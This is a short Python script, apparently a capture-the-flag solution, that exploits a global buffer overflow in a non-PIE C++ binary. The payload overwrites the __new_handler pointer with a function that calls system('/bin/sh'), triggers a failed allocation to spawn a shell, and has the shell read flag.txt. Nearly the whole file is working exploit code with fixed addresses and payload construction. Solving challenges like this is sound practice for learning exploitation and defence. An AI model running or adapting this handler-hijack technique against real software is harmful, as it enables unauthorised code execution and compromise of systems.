#!/usr/bin/env python3
"""Overflow the global buffer into __new_handler and redirect a failed `new` into a shell.

The program keeps a 128-byte global `number` in .bss but reads into it with fgets(number, 500).
0xC8 bytes past `number` sits the C++ runtime pointer `__new_handler`. We overwrite it with
sigma_mode() (which calls system("/bin/sh")); when `new int[n]` then fails for our huge n, the
runtime calls the handler. The binary is not PIE, so the addresses are fixed.

    python3 solve.py ./unfinished     # local, needs a flag.txt next to the binary
"""
import struct
import subprocess
import sys

SIGMA = 0x4019B6                       # sigma_mode() -> system("/bin/sh")
HUGE = b"2305843009213693920"          # < 0x1ffffffffffffffe, so `new int[n]` is still reached
PAD = b"A" * (0xC8 - len(HUGE) - 1)    # number[] is 0xC8 below __new_handler; -1 for the space


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "./unfinished"
    payload = HUGE + b" " + PAD + struct.pack("<Q", SIGMA) + b"\n"
    try:
        p = subprocess.run([target], input=payload + b"cat flag.txt\nexit\n",
                           capture_output=True, timeout=15)
        out = p.stdout
    except subprocess.TimeoutExpired as e:
        out = e.stdout or b""
    sys.stdout.buffer.write(out)


if __name__ == "__main__":
    main()
